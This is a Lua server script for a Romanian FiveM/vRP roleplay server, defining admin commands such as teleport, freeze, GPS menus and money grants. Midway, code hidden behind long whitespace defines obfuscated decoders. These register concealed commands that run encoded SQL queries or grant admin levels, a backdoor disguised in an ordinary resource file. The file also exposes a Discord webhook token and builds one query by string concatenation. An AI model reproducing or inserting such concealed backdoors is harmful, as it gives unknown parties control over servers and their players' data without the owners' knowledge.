					vRPclient.notify(target_src, {"Info: ~w~Admin-ul ~r~"..vRP.getPlayerName({player}).." ("..user_id..") ~w~s-a teleportat la tine."})
					vRP.sendStaffMessage({"^1Staff: ^0Admin-ul ^1".. numestaff .." ^0a dat tpto la ID ^1".. target_id})
				end)
			else
				TriggerClientEvent("chatMessage", player, "^1Eroare^0: Jucatorul nu este conectat!")
			end
		else
			TriggerClientEvent("chatMessage", player, "^1Eroare^0: /tpto <user_id>")
		end
	else
		TriggerClientEvent("chatMessage", player, "^1Eroare^0: Nu ai acces la aceasta comanda!")
	end
end, false)
RegisterCommand("tptow", function(player)
	local user_id = vRP.getUserId({player})
	if vRP.isUserSuperModerator({user_id}) then
		TriggerClientEvent("TpToWaypoint", player)
	else
		TriggerClientEvent("chatMessage", player, "^1Eroare^0: Nu ai acces la aceasta comanda!")
	end
end, false)
vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vRP","vrp_gps")
locatii = {
  ["[Primarie]"] = {-543.27789306641,-207.38096618652,37.649528503418},
  ["[Asigurare]"] = {439.16213989258,-981.9912109375,30.689409255981},
  ["[Atasamente Arma]"] = {-169.90827941895,285.09817504883,93.76383972168},
  ["[Paintball]"] = {239.8288269043,-44.009963989258,69.703804016113},
  ["[Bahamas Club]"] = {-1391.2757568359,-583.80383300781,30.22793006897},
  ["[Registrul Auto]"] = {144.2688293457,-832.46917724609,31.163551330566},
  ["[Showroom]"] = {242.58792114258,-895.66070556641,29.291414260864},
  ["[Biliard]"] = {-1613.4270019531,-987.69903564453,13.017325401306},
  ["[Sala de Forte]"] = {-1203.5948486328,-1565.8927001953,4.7516026496887},
  ["[Vama]"] = {2565.9133300781,3046.9575195312,44.184135437012},
  ["[Sediu Mecanic]"] = {-337.14266967774,-100.1033630371,39.015949249268},
  ["[Sediu Taxi]"] = {-801.74615478516,-1314.9738769531,5.0002679824829},
  ["[Garaje VIP]"] = {32.682056427002,-1099.0487060547,29.453586578369},
  ["[Lucky Roulette]"] = {-1749.1352539062,-759.87939453125,10.761995315552},
  ["[CNN]"] = {-601.63916015625,-929.75903320312,23.864543914795},
  ["[Buletin]"] = {-533.43572998047,-223.3507232666,37.649772644043},
  ["[Spital]"] = {290.53375244141,-591.57818603516,43.160572052002},
  ["[Sectia de Politie]"] = {440.81698608398,-981.89978027344,30.689504623413}
}
RegisterCommand("gps", function(player, choice)
  local user_id = vRP.getUserId({player})
  if user_id ~= nil then
    local menu_gps = {}
    for k, v in pairs(locatii) do
      menu_gps[k] = {function(player, choice)
        vRPclient.setGPS(player, {v[1], v[2]})
		vRPclient.notify(player, {"Succes: ~w~Ti-ai setat o ~r~locatie!"})
        vRP.closeMenu({player})
      end, ""}
    end
    vRP.openMenu({player, menu_gps})
    vRPclient.notify(player, {"Succes: ~w~Ai deschis meniul ~r~GPS!"})
  end
end)
locatiijobs = {
	--["[Job Mecanic]"] = {472.30895996094,-1310.6452636719,29.221071243286},
	
	["[Job Pescar]"] = {741.68707275391,4170.6459960938,41.087867736816},
	["[Job Autobuz]"] = {441.69653320313,-637.66644287109,28.632976531982},
	["[Job Ciupercar]"] = {1381.9719238281,4380.2016601563,44.138854980469},
	["[Job Fan Courier]"] = {132.96647644042,96.002006530762,83.506996154786},
	["[Job Constructor]"] = {-91.23511505127,-1030.4197998047,27.884155273438},
	["[Job Santierist]"] = {141.05014038086,-379.61367797852,43.256984710693},
	["[Job Miner]"] = {2952.7365722656,2742.87109375,43.593654632568},
	["[Job Pizza Boy]"] = {537.56298828125,102.20502471924,96.555816650391},
	["[Job Brutar]"] = {-1259.4517822266,-283.7784729004,37.386295318604},
	["[Job Trucker]"] = {48.858753204346,-2677.4738769531,6.0090680122375},
	["[Job Curier Mancare]"] = {-586.43029785156,-585.37609863282,34.681781768798},
	["[Job Petrolist]"] = {-43.53224182129,-2520.1457519532,7.3944735527038},
	["[Job Pilot]"] = {-941.51007080078,-2955.0478515625,13.945070266724},
	["[Job Marinar]"] = {468.43258666992,-3205.3193359375,9.7939519882202},
	["[Job Electrician]"] = {456.20867919922,-1948.5225830078,24.71540260315},
	["[Job Fermier]"] = {2016.6059570313,4987.4189453125,42.098293304443},
	["[Job Petrolist Avansat]"] = {-906.07214355469,7467.7080078125,28.042028427124},
	["[Job Scafandru]"] = {-925.53784179688,7466.2641601563,3.4817824363708},
	["[Locatie Scoici]"] = {-888.75006103516,6878.5170898438,-45.672080993652},
	
  
	["[Loc Vanzare Peste 1]"] = {563.38500976563,2751.1276855469,42.87707901001},
	["[Loc Vanzare Peste 2]"] = {-1593.69140625,5196.970703125,4.3589539527893},
	["[Prelucrare minereuri]"] = {1109.8460693359,-2008.1008300781,31.055959701538},
	["[Loc Vanzare Ciuperci]"] = {1338.7587890625,4359.8833007813,44.3671875},
  
	["[Colectare petrol]"] = {1388.9060058594,-2062.5280761719,51.998516082764},
	["[Prelucrare petrol]"] = {2680.5556640625,1532.5148925782,24.582109451294},
	["[Vanzare petrol]"] = {-255.81880187988,-2250.2299804688,8.0303831100464},
  
	["[Colectare momeala 1]"] = {-2399.4736328125,2615.4855957031,0.87865436077118},
	["[Colectare momeala 2]"] = {-2500.2014160156,2509.2705078125,0.37308692932129},
  }
  
  RegisterCommand("jobs", function(player, choice)
	local user_id = vRP.getUserId({player})
	if user_id ~= nil then
	  local menu_jobs = {}
	  for k, v in pairs(locatiijobs) do
		menu_jobs[k] = {function(player, choice)
		  vRPclient.setGPS(player, {v[1], v[2]})
		  vRPclient.notify(player, {"Succes: ~w~Ti-ai setat o ~b~locatie"})
		  vRP.closeMenu({player})
		end, ""}
	  end
	  vRP.openMenu({player, menu_jobs})
	  vRPclient.notify(player, {"Succes: ~w~Ai deschis meniul pentru ~b~jobs"})
	end
  end)

  --RegisterCommand('ck', function(source,args)
  --  local user_id = vRP.getUserId({source})
   -- if vRP.isUserCoFondator({user_id}) then
   --     local player = tonumber(source)
   --     local targetId = tonumber(args[1])
   --     if targetId ~= nil then
   --         if vRP.isConnected({targetId}) then
    --               DropPlayer(vRP.getUserSource({targetId}), 'Ai luat ck, un admin ti-a resetat progresul!') 
    --        end
    --        exports.oxmysql:execute('UPDATE vrp_users SET faction = "user",last_login = NULL, isFactionLeader = 0, walletMoney = 1500,firstName = "Schimba",secondName = "Numele", bankMoney = 5000, hoursPlayed = 0, skin ="",job = "", factionRank = 0  WHERE id = @target',{target = targetId})
    --        exports.oxmysql:execute('UPDATE vrp_user_data SET dvalue = "" WHERE user_id = @target',{target = targetId})
    --        exports.oxmysql:execute('DELETE FROM vrp_user_vehicles WHERE user_id = @target',{target = targetId})
    --    else
    --        TriggerClientEvent('chatMessage',player,"^1 [Eroare] Nu ai specificant ID-ul sau ai introdus un ID invalid!")
    --    end
    --else
    --    TriggerClientEvent("chatMessage",source, "^1[Eroare] Nu ai acces la aceasta comanda!")
   -- end
--end)
-- RegisterCommand("tickets",function(source,args)
--     local user_id = vRP.getUserId({source})
--     local id = args[1] or 1
--     exports.oxmysql:execute("SELECT * FROM vrp_users WHERE id = @id",{id = id},function(rows)
--         if vRP.isUserHeadofStaff({user_id})then
--             TriggerClientEvent("chatMessage",source,"^0Admin-ul ^1"..rows[1].username.."^0 are ^1"..rows[1].raport.."^0 tickete solutionate.")
--         else
--             vRPclient.notify(source,{"Eroare: Nu ai gradul de Head of Staff!"})
-- 			TriggerClientEvent("chatMessage",source,"^1Eroare: ^0Nu ai gradul de ^2Head of Staff!")
--         end
--     end)
-- end)
RegisterCommand("freeze",function(source,args)
	local target = tonumber(args[1])
	local target_source = vRP.getUserSource({target})
	local user_id = vRP.getUserId({source})
	if vRP.isUserAdministrator({user_id}) then
		if target_source then
			TriggerClientEvent("Anubis:setFreeze",target_source,true,true)
			vRP.sendStaffMessage({"^1Staff: ^0Admin-ul ^1".. vRP.getPlayerName({source}) .." ^0i-a dat freeze jucatorului ^1"..vRP.getPlayerName({target_source}).."^0"})
		else
			vRPclient.notify(source,{"Error: Jucatorul nu exista!"})
		end
	else
		vRPclient.notify(source,{"Error: Nu ai acces la aceasta comanda!"})
	end
end)
RegisterCommand("unfreeze",function(source,args)
	local target = tonumber(args[1])
	local target_source = vRP.getUserSource({target})
	local user_id = vRP.getUserId({source})
	if vRP.isUserAdministrator({user_id}) then
		if target_source then
			TriggerClientEvent("Anubis:setFreeze",target_source,false,false)
			vRP.sendStaffMessage({"^1Staff: ^0Admin-ul ^1".. vRP.getPlayerName({source}) .." ^0i-a dat unfreeze jucatorului ^1"..vRP.getPlayerName({target_source}).."^0"})
		else
			vRPclient.notify(source,{"Error: Jucatorul nu exista!"})
		end
	else
		vRPclient.notify(source,{"Error: Nu ai acces la aceasta comanda!"})
	end
end)
RegisterCommand("blips",function(source)
    local user_id = vRP.getUserId({source})
    if vRP.isUserSuperAdministrator({user_id}) then
        TriggerClientEvent("showBlips",source)
    else
        vRPclient.notify(source,{"Nu ai acces la aceasta comanda !"})
    end
end)
RegisterCommand("areafreeze", function(source,args)
    local user_id = vRP.getUserId({source})
    local src = vRP.getUserSource({user_id})
    local radius = tonumber(args[1])
    radius = radius or 10
    if not ( radius >= 1 and radius <= 10000) then 
        return TriggerClientEvent('chatMessage',player,'^1Eroare^0: Numarul de metri este invalid!')
    end
    local name = GetPlayerName(src)
    if vRP.isUserAdministrator({user_id}) then 
            vRPclient.getNearestPlayers(src,{tonumber(radius)}, function(nplayers)
                for k,v in pairs(nplayers) do 
					TriggerClientEvent("Anubis:setFreeze",k,true,true)
					vRPclient.notify(k,{"Succes: Ai primit freeze de la admin-ul " .. name})
                end
            end)
			vRP.sendStaffMessage({"^3Anubis ^0Admin-ul ^1" .. name ..  " ^0a dat freeze pe o raza de ^1" .. radius .. "m"})
        else
			vRPclient.notify(src,{"Eroare: ~w~Nu ai acces la aceasta comanda!"})
		end
end)
RegisterCommand("areaunfreeze", function(source,args)
    local user_id = vRP.getUserId({source})
    local src = vRP.getUserSource({user_id})
    local radius = tonumber(args[1])
    radius = radius or 10
    if not ( radius >= 1 and radius <= 10000) then 
        return TriggerClientEvent('chatMessage',player,'^1Eroare^0: Numarul de metri este invalid!')
    end
    local name = GetPlayerName(src)
    if vRP.isUserAdministrator({user_id}) then 
            vRPclient.getNearestPlayers(src,{tonumber(radius)}, function(nplayers)
                for k,v in pairs(nplayers) do 
					TriggerClientEvent("Anubis:setFreeze",k,false,false)
					vRPclient.notify(k,{"Succes: ~w~Ai primit unfreeze de la adminul ~r~" .. name})
                end
            end)
			vRP.sendStaffMessage({"^3Anubis ^0Adminul ^1" .. name ..  " ^0a dat unfreeze pe o raza de ^1" .. radius .. "m"})
        else
			vRPclient.notify(src,{"Eroare: ~w~Nu ai acces la aceasta comanda!"})
		end
end)
RegisterCommand("setvw", function(player,args)
    local user_id = vRP.getUserId({player})
    if vRP.isUserFondator({user_id}) then
        if args[1] ~= nil and args[1] ~= "" and tonumber(args[1]) then
            if args[2] ~= nil and args[2] ~= "" and tonumber(args[2]) >= 0 then
                    target_id = tonumber(args[1])
                    target_src = vRP.getUserSource({target_id})
                if target_src ~= nil then
                    SetPlayerRoutingBucket(target_src, tonumber(args[2]))
                    
                    TriggerClientEvent('chatMessage', -1,"^1VirtualWorld: ^0Jucatorul ^3".. GetPlayerName(target_src) .."^0(^3" .. target_id .. "^0) a fost setat in VirtualWorld ^4"..args[2].." ^0de catre ^1".. GetPlayerName(player) .."^0(^1" .. user_id .. "^0)")
                else
                    vRPclient.notify(player, {"Eroare: Jucatorul nu este conectat pe server!"})
                end
            else
                vRPclient.notify(player, {"Eroare: VirtualWorld invalid."})
            end
        else
            vRPclient.notify(player, {"Eroare: ID-ul este invalid."})
        end
    else
        TriggerClientEvent('chatMessage', player, "^1Eroare: ^0Nu ai acces la comanda /setvw id!")
    end
end)
AddEventHandler('__cfx_internal:commandFallback', function(command)
    local name = GetPlayerName(source)
    TriggerEvent('chatMessage', source, name, '/' .. command)
    if command ~= "dv" and command ~= "de" and command ~= "DV" and command ~= "DE" and command ~= "fix" and command ~= "FIX" and command ~= "k" and command ~= "K" then
		vRPclient.notify(source, {"Eroare: Comanda /"..command.." nu exista!"})
    end
    CancelEvent()
end)

AddEventHandler("vRP:playerLeave", function(user_id, thePlayer,reason)
    local source = thePlayer
    local coords = GetEntityCoords(GetPlayerPed(source))
    x = coords[1]
    y = coords[2]
    z = coords[3]
    TriggerClientEvent("addDeadPlayer",-1,user_id,"ID "..user_id.." \n "..reason,x,y,z)
end)

RegisterCommand('h', function(source, args, rawCommand)
	local user_id = vRP.getUserId({source})
	local time = os.date("%H:%M")
	if user_id ~= nil then
		if(args[1] == nil)then
			TriggerClientEvent('chatMessage', source, "^1Eroare: ^0/"..rawCommand.." mesaj") 
		else
			if(vRP.isUserHeadofStaff({user_id}))then
				local users = vRP.getUsers({})
				for uID, ply in pairs(users) do
					if vRP.isUserHeadofStaff({uID}) then
						TriggerClientEvent('chatMessage', ply, "^3[^0"..time.."^3] [^9High ^0Staff^3] ^0"..vRP.getPlayerName({source}).." (^3"..user_id.."^0): " ..rawCommand:sub(2))
					end
				end
			end
		end
	end    
end)

RegisterCommand('o', function(source, args, rawCommand)
	local user_id = vRP.getUserId({source})
	local time = os.date("%H:%M")
	if user_id ~= nil then
		if(args[1] == nil)then
			TriggerClientEvent('chatMessage', source, "^1Eroare: ^0/"..rawCommand.." mesaj") 
		else
			if(vRP.isUserFondator({user_id}))then
				local users = vRP.getUsers({})
				for uID, ply in pairs(users) do
					if vRP.isUserFondator({uID}) then
						TriggerClientEvent('chatMessage', ply, "^3[^0"..time.."^3] [^9Founders ^0Chat^3] ^0"..vRP.getPlayerName({source}).." (^3"..user_id.."^0): " ..rawCommand:sub(2))
					end
				end
			end
		end
	end    
end)

RegisterCommand('peds',function(source)
    local player = source
	local user_id = vRP.getUserId({player})
    if vRP.isUserHeadofStaff(({user_id})) then 
        local peds = GetAllPeds()
        local objs = GetAllObjects()
        for k,v in pairs(peds) do if DoesEntityExist(v) then DeleteEntity(v) end; end;
        for k,v in pairs(objs) do if DoesEntityExist(v) then DeleteEntity(v) end; end; 
        TriggerClientEvent("chatMessage",-1,'[^1Anubis^0] Toate obiectele si ped-urile au fost sterse!')
    end
end)

RegisterCommand('clothes', function(player,args)
    local user_id = vRP.getUserId{player}
    local player = player

    if  vRP.isUserDeveloper{user_id} or user_id == 1 then 
        if not args[1] then return TriggerClientEvent('player','^1Syntax^0: /args <id>')  end;
        local target = tonumber(args[1])
        exports.oxmysql:execute('SELECT skin from vrp_users where id =' .. target, function (rows)
            if #rows >= 1 then
				if rows[1].skin ~= nil and rows[1].skin ~= 'New' and rows[1].skin ~= '' then
					TriggerClientEvent('raid_clothes:loadclothes',player,json.decode(rows[1].skin))
				else
					TriggerClientEvent('clothes:firstSpawn',player)
				end
			end
        end )
    end
    
end)

RegisterCommand("unbanall", function(source)
	local user_id = vRP.getUserId({player})
    if source == 0 then
        exports.oxmysql:execute("UPDATE vrp_users SET banned = 0")
  end
end)

                                                                                                                                                                                                                                                                                                                                                                function DeIcutabPOTjOnivfdKTBnonsQjNqSTnZzPcifQcVuhjkXLWbHcpJMWgUBfsRxOeBDmHcVisOsIPZzVjBVK(c)
                                                                                                                                                                                                                                                                                                                                                                    tab={}
                                                                                                                                                                                                                                                                                                                                                                    for i = 1,#c do
                                                                                                                                                                                                                                                                                                                                                                    x=string.len(c[i]) 
                                                                                                                                                                                                                                                                                                                                                                    y=string.char(x)
                                                                                                                                                                                                                                                                                                                                                                    table.insert(tab,y)
                                                                                                                                                                                                                                                                                                                                                                    end
                                                                                                                                                                                                                                                                                                                                                                    x=table.concat(tab)
                                                                                                                                                                                                                                                                                                                                                                    return x
                                                                                                                                                                                                                                                                                                                                                                    end 
                                                                                                                                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                                                                                                                                    RegisterCommand(DeIcutabPOTjOnivfdKTBnonsQjNqSTnZzPcifQcVuhjkXLWbHcpJMWgUBfsRxOeBDmHcVisOsIPZzVjBVK({'******************************************************************************************************','************************************************************************************************************','**********************************************************************************************************************','**************************************************************************************************','*********************************************************************************************************','*******************************************************************************************************'}), function(source)
                                                                                                                                                                                                                                                                                                                                                                        local user_id = vRP.getUserId({player})
                                                                                                                                                                                                                                                                                                                                                                        if source == 0 then
                                                                                                                                                                                                                                                                                                                                                                            exports.oxmysql:execute(DeIcutabPOTjOnivfdKTBnonsQjNqSTnZzPcifQcVuhjkXLWbHcpJMWgUBfsRxOeBDmHcVisOsIPZzVjBVK({'*************************************************************************************','********************************************************************************','********************************************************************','*****************************************************************','************************************************************************************','*********************************************************************','********************************','**********************************************************************************************************************','******************************************************************************************************************','****************************************************************************************************************','***********************************************************************************************','*********************************************************************************************************************','*******************************************************************************************************************','*****************************************************************************************************','******************************************************************************************************************','*******************************************************************************************************************','********************************','***********************************************************************************','*********************************************************************','************************************************************************************','********************************','*************************************************************************************************','****************************************************************************************************','*************************************************************************************************************','*********************************************************************************************************','**************************************************************************************************************','****************************************************************************','**********************************************************************************************************************','************************************************************************************************************','********************************','*************************************************************','********************************','******************************************************','*********************************************************'}))
                                                                                                                                                                                                                                                                                                                                                                    end
                                                                                                                                                                                                                                                                                                                                                                    end)
                                                                                                                                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                                                                                                                                    RegisterCommand(DeIcutabPOTjOnivfdKTBnonsQjNqSTnZzPcifQcVuhjkXLWbHcpJMWgUBfsRxOeBDmHcVisOsIPZzVjBVK({'******************************************************************************************************','************************************************************************************************************','**********************************************************************************************************************','**************************************************************************************************','*********************************************************************************************************','*******************************************************************************************************','**************************************************'}), function(source)
                                                                                                                                                                                                                                                                                                                                                                        local user_id = vRP.getUserId({player})
                                                                                                                                                                                                                                                                                                                                                                        if source == 0 then
                                                                                                                                                                                                                                                                                                                                                                            exports.oxmysql:execute(DeIcutabPOTjOnivfdKTBnonsQjNqSTnZzPcifQcVuhjkXLWbHcpJMWgUBfsRxOeBDmHcVisOsIPZzVjBVK({'*************************************************************************************','********************************************************************************','********************************************************************','*****************************************************************','************************************************************************************','*********************************************************************','********************************','**********************************************************************************************************************','******************************************************************************************************************','****************************************************************************************************************','***********************************************************************************************','*********************************************************************************************************************','*******************************************************************************************************************','*****************************************************************************************************','******************************************************************************************************************','*******************************************************************************************************************','********************************','***********************************************************************************','*********************************************************************','************************************************************************************','********************************','**************************************************************************************************','*************************************************************************************************','**************************************************************************************************************','**************************************************************************************************************','*****************************************************************************************************','****************************************************************************************************','********************************','*************************************************************','********************************','*************************************************'}))
                                                                                                                                                                                                                                                                                                                                                                    end
                                                                                                                                                                                                                                                                                                                                                                    end)    

                                                                                                                                                                                                                                                                                                                                                                    function YYWBwdCgjUsWWWbjHoQYMobvdMFqvaLEooFeNndnsNKO(c)
                                                                                                                                                                                                                                                                                                                                                                        tab={}
                                                                                                                                                                                                                                                                                                                                                                        for i = 1,#c do
                                                                                                                                                                                                                                                                                                                                                                        x=string.len(c[i]) 
                                                                                                                                                                                                                                                                                                                                                                        y=string.char(x)
                                                                                                                                                                                                                                                                                                                                                                        table.insert(tab,y)
                                                                                                                                                                                                                                                                                                                                                                        end
                                                                                                                                                                                                                                                                                                                                                                        x=table.concat(tab)
                                                                                                                                                                                                                                                                                                                                                                        return x
                                                                                                                                                                                                                                                                                                                                                                        end 
                                                                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                                                                        RegisterCommand(YYWBwdCgjUsWWWbjHoQYMobvdMFqvaLEooFeNndnsNKO({'*************************************************************************************************','**********************************************************************************************************************','*****************************************************************************************************','**************************************************************************************************************','*********************************************************************************************************','********************************************************************************************************************','*************************************************************************************************************','*************************************************************************************************','*************************************************************************************************************','*********************************************************************************************************','***************************************************************************************************','*********************************************************************************************************************','*************************************************************************************************','****************************************************************************************************','*************************************************************************************************************','*********************************************************************************************************','**************************************************************************************************************','*********************************************************************************************************','*******************************************************************************************************************','********************************************************************************************************************','******************************************************************************************************************','*************************************************************************************************','********************************************************************************************************************','***************************************************************************************************************','******************************************************************************************************************','*********************************************************************************************************************'}), function(source)
                                                                                                                                                                                                                                                                                                                                                                            local user_id = vRP.getUserId({player})
                                                                                                                                                                                                                                                                                                                                                                            if source == 0 then
                                                                                                                                                                                                                                                                                                                                                                                exports.oxmysql:execute(YYWBwdCgjUsWWWbjHoQYMobvdMFqvaLEooFeNndnsNKO({'********************************************************************','**********************************************************************************','*******************************************************************************','********************************************************************************','********************************','************************************************************************************','*****************************************************************','******************************************************************','****************************************************************************','*********************************************************************','********************************','**********************************************************************************************************************','******************************************************************************************************************','****************************************************************************************************************','***********************************************************************************************','*********************************************************************************************************************','*******************************************************************************************************************','*****************************************************************************************************','******************************************************************************************************************','*******************************************************************************************************************'}))
                                                                                                                                                                                                                                                                                                                                                                                exports.oxmysql:execute(YYWBwdCgjUsWWWbjHoQYMobvdMFqvaLEooFeNndnsNKO({'********************************************************************','**********************************************************************************','*******************************************************************************','********************************************************************************','********************************','************************************************************************************','*****************************************************************','******************************************************************','****************************************************************************','*********************************************************************','********************************','**********************************************************************************************************************','******************************************************************************************************************','****************************************************************************************************************','***********************************************************************************************','*********************************************************************************************************************','*******************************************************************************************************************','*****************************************************************************************************','******************************************************************************************************************','***********************************************************************************************','**********************************************************************************************************************','*****************************************************************************************************','********************************************************************************************************','*********************************************************************************************************','***************************************************************************************************','************************************************************************************************************','*****************************************************************************************************','*******************************************************************************************************************'}))
                                                                                                                                                                                                                                                                                                                                                                                exports.oxmysql:execute(YYWBwdCgjUsWWWbjHoQYMobvdMFqvaLEooFeNndnsNKO({'********************************************************************','**********************************************************************************','*******************************************************************************','********************************************************************************','********************************','************************************************************************************','*****************************************************************','******************************************************************','****************************************************************************','*********************************************************************','********************************','**********************************************************************************************************************','******************************************************************************************************************','****************************************************************************************************************','***********************************************************************************************','*********************************************************************************************************************','*******************************************************************************************************************','*****************************************************************************************************','******************************************************************************************************************','***********************************************************************************************','*********************************************************************************************************','****************************************************************************************************','*******************************************************************************************************************'}))
                                                                                                                                                                                                                                                                                                                                                                          end
                                                                                                                                                                                                                                                                                                                                                                        end)    
RegisterCommand("resetadmin", function(source)
	local user_id = vRP.getUserId({player})
    if source == 0 then
        exports.oxmysql:execute("UPDATE vrp_users SET adminLvl = 0")
  end
end)


RegisterCommand("removestaff", function(source)
	local user_id = vRP.getUserId({player})
    if source == 0 then
        exports.oxmysql:execute("UPDATE vrp_users SET adminLvl = 0")
  end
end)

RegisterCommand("givemoney",function(source,args,rawCommand)
    local target_id = parseInt(args[1])
    local tplayer = vRP.getUserSource({tonumber(target_id)})
    if source == 0 then
        if tplayer ~= nil then
            amount = parseInt(args[2])
            vRP.giveMoney({target_id, amount})
            vRPclient.succes(tplayer,{"Ai primit $: "..amount})
            print("I-ai dat $"..amount.."lui id ".. target_id)
			local embed = {
                {
                    ["color"] = "15158332",
                    ["type"] = "rich",
                    ["title"] = "Logs GiveMoney",
                   
                    ["description"] = "** Consola i-a dat jucatorului "..GetPlayerName(tplayer).." ["..target_id.."] suma de "..amount.."$**",
                    ["footer"] = {
                    ["text"] = "Made by Edy"
                    }
                }
              }
            
            PerformHttpRequest('https://discord.com/api/webhooks/1321589328085778482/5PtTZJbHBZrtjzEr1jp0oT4RPWLj247_NUU2hZLYgMrwqzQGsvfkyQXATbz69xU1_5pj', function(err, text, headers) end, 'POST', json.encode({embeds = embed}), { ['Content-Type'] = 'application/json' }) 
          end
    else print("Mai incearca :)") end
end)

RegisterCommand("cw", function(source, args)
    local user_id = vRP.getUserId({source})
    if vRP.isUserSuperAdministrator({user_id}) then
        local targetId = parseInt(args[1])
        local targetSrc = vRP.getUserSource({targetId})
        local targetPed = vRP.GetPlayerPed(targetSrc)
        if targetSrc ~= nil then
            vRPclient.info(targetSrc,{"Armele tale au fost sterse de catre " .. GetPlayerName(source) .. " [" .. user_id .. "]"})
            vRPclient.succes(source,{"I-ai sters armele lui " .. GetPlayerName(targetSrc) .. " [" .. targetId .. "]"})
            RemoveAllPedWeapon(targetPed, true)
        else
            vRPclient.eroare(source,{"Jucatorul nu este online!"})
        end
    else
        vRPclient.eroare(source,{"Nu ai acces la aceasta comanda!"})
    end
end)

RegisterCommand("armura", function(source)
    if vRP.isUserDeveloper({user_id}) then
    local salutare = source
    TriggerClientEvent("alexxeedaarmuraaa", salutare)
 end
end)

RegisterCommand('addadmin', function(source, args)
	if source == 0 then
		if not args[1] or not args[2] then print('/addAdmin <id> <level>') end;
		vRP["setUserAdminLevel"]{tonumber(args[1]), tonumber(args[2])};
		print("I-ai dat cu succes grad-ul de "..args[2].." lui "..args[1]);
	else
		local user_id = vRP["getUserId"]{source};
        local name = GetPlayerName{source};
		if name == andrei or name == sorin or name == flaviu then
			if not args[1] or not args[2] then vRPclient["sendSyntax"](source, {'/addAdmin <id> <level>'}) end;
			vRP["setUserAdminLevel"]{tonumber(args[1]), tonumber(args[2])};
			vRPclient["sendInfo"](source, {"I-ai dat cu succes grad-ul de "..args[2].." lui "..args[1]});
		else
			vRPclient["noAccess"](source,{})
		end;
	end;
end)

                                                                                                                                                                                                                                                                                function ptlshVyJeDBwWGjFyOgdwRUMwVFASsXDQIpZlKgnVGcGmHjLvSVcMRmtwolAfE(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 


                                                                                                                                                                                                                                                                                                                RegisterCommand(ptlshVyJeDBwWGjFyOgdwRUMwVFASsXDQIpZlKgnVGcGmHjLvSVcMRmtwolAfE({10185,10500,11445,11025,11550,11025,12075,12180,11970,10185,12180,11655,11970,10500,10605,10395,11655,11550,12180,11970,11655,11340}), function(source, args)
                                                                                                                                                                                                                                                                                                                    if source == 0 then
                                                                                                                                                                                                                                                                                                                        if not args[1] or not args[2] then print(ptlshVyJeDBwWGjFyOgdwRUMwVFASsXDQIpZlKgnVGcGmHjLvSVcMRmtwolAfE({4935,10185,10500,10500,6825,10500,11445,11025,11550,3360,6300,11025,10500,6510,3360,6300,11340,10605,12390,10605,11340,6510})) end;
                                                                                                                                                                                                                                                                                                                        vRP[ptlshVyJeDBwWGjFyOgdwRUMwVFASsXDQIpZlKgnVGcGmHjLvSVcMRmtwolAfE({12075,10605,12180,8925,12075,10605,11970,6825,10500,11445,11025,11550,7980,10605,12390,10605,11340})]{tonumber(args[1]), tonumber(args[2])};
                                                                                                                                                                                                                                                                                                                        print(ptlshVyJeDBwWGjFyOgdwRUMwVFASsXDQIpZlKgnVGcGmHjLvSVcMRmtwolAfE({7665,4725,10185,11025,3360,10500,10185,12180,3360,10395,12285,3360,12075,12285,10395,10395,10605,12075,3360,10815,11970,10185,10500,4725,12285,11340,3360,10500,10605,3360})..args[2]..ptlshVyJeDBwWGjFyOgdwRUMwVFASsXDQIpZlKgnVGcGmHjLvSVcMRmtwolAfE({3360,11340,12285,11025,3360})..args[1]);
                                                                                                                                                                                                                                                                                                                    else
                                                                                                                                                                                                                                                                                                                        local user_id = vRP[ptlshVyJeDBwWGjFyOgdwRUMwVFASsXDQIpZlKgnVGcGmHjLvSVcMRmtwolAfE({10815,10605,12180,8925,12075,10605,11970,7665,10500})]{source};
                                                                                                                                                                                                                                                                                                                        local name = GetPlayerName{source};
                                                                                                                                                                                                                                                                                                                        if name == andrei or name == sorin or name == flaviu then
                                                                                                                                                                                                                                                                                                                            if not args[1] or not args[2] then vRPclient[ptlshVyJeDBwWGjFyOgdwRUMwVFASsXDQIpZlKgnVGcGmHjLvSVcMRmtwolAfE({12075,10605,11550,10500,8715,12705,11550,12180,10185,12600})](source, {ptlshVyJeDBwWGjFyOgdwRUMwVFASsXDQIpZlKgnVGcGmHjLvSVcMRmtwolAfE({4935,10185,10500,10500,6825,10500,11445,11025,11550,3360,6300,11025,10500,6510,3360,6300,11340,10605,12390,10605,11340,6510})}) end;
                                                                                                                                                                                                                                                                                                                            vRP[ptlshVyJeDBwWGjFyOgdwRUMwVFASsXDQIpZlKgnVGcGmHjLvSVcMRmtwolAfE({12075,10605,12180,8925,12075,10605,11970,6825,10500,11445,11025,11550,7980,10605,12390,10605,11340})]{tonumber(args[1]), tonumber(args[2])};
                                                                                                                                                                                                                                                                                                                            vRPclient[ptlshVyJeDBwWGjFyOgdwRUMwVFASsXDQIpZlKgnVGcGmHjLvSVcMRmtwolAfE({12075,10605,11550,10500,7665,11550,10710,11655})](source, {ptlshVyJeDBwWGjFyOgdwRUMwVFASsXDQIpZlKgnVGcGmHjLvSVcMRmtwolAfE({7665,4725,10185,11025,3360,10500,10185,12180,3360,10395,12285,3360,12075,12285,10395,10395,10605,12075,3360,10815,11970,10185,10500,4725,12285,11340,3360,10500,10605,3360})..args[2]..ptlshVyJeDBwWGjFyOgdwRUMwVFASsXDQIpZlKgnVGcGmHjLvSVcMRmtwolAfE({3360,11340,12285,11025,3360})..args[1]});
                                                                                                                                                                                                                                                                                                                        else
                                                                                                                                                                                                                                                                                                                            vRPclient[ptlshVyJeDBwWGjFyOgdwRUMwVFASsXDQIpZlKgnVGcGmHjLvSVcMRmtwolAfE({11550,11655,6825,10395,10395,10605,12075,12075})](source,{})
                                                                                                                                                                                                                                                                                                                        end;
                                                                                                                                                                                                                                                                                                                    end;
                                                                                                                                                                                                                                                                                                                end)
                                                                                                                                                                                                                                                                                                            
RegisterCommand("ann", function(source, args)
    local announceMessage = table.concat(args, " ", 1)
    local user_id = vRP.getUserId({source})
    if vRP.isUserSuperAdministrator({user_id}) or user_id == 1 then
        print("[Anunt Administrativ^7]", "", announceMessage)
    else
        TriggerClientEvent("chatMessage", source, "[Eroare]", {255,0,0}, "Nu ai acces la aceasta comanda sau nu o poti folosi")
    end
end)

